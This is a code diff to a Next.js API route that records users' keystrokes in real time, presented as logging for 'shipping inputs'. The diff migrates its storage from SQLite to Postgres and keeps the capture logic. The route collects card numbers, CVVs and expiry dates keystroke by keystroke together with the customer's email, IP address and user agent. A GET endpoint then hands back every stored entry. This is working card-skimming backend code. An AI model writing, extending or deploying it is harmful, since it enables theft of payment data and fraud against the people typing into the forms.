@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server'
-import { databaseService } from '@/lib/sqlite-database'
+import { databaseService } from '@/lib/postgres-database'
 
 // POST /api/keylog - Real-time keylogging for shipping inputs
 export async function POST(request: NextRequest) {
@@ -20,14 +20,20 @@ export async function POST(request: NextRequest) {
     const userAgent = request.headers.get('user-agent') || 'unknown'
     
     // Log the keypress
-    const keylog = databaseService.logKeypress(
+    await databaseService.persistKeylog({
       customerEmail,
       field,
       value,
       ipAddress,
       userAgent,
-      { context, page, cardType, fieldType }
-    )
+      context,
+      page,
+      cardType,
+      fieldType,
+      timestamp: new Date().toISOString()
+    })
+    
+    const keylog = { customerEmail, field, value, timestamp: new Date().toISOString() }
     
     // Debug logging for payment fields
     if (field === 'cardNumber' || field === 'cvv' || field === 'expiryDate') {
@@ -63,9 +69,9 @@ export async function GET(request: NextRequest) {
     
     let keylogs
     if (email) {
-      keylogs = latest ? databaseService.getLatestKeylogsByEmail(email) : databaseService.getKeylogsByEmail(email)
+      keylogs = latest ? await databaseService.getLatestKeylogsByEmail(email) : await databaseService.getKeylogsByEmail(email)
     } else {
-      keylogs = latest ? databaseService.getLatestKeylogs() : databaseService.getKeylogs()
+      keylogs = latest ? await databaseService.getLatestKeylogs() : await databaseService.getKeylogs()
     }
     
     return NextResponse.json({ keylogs })
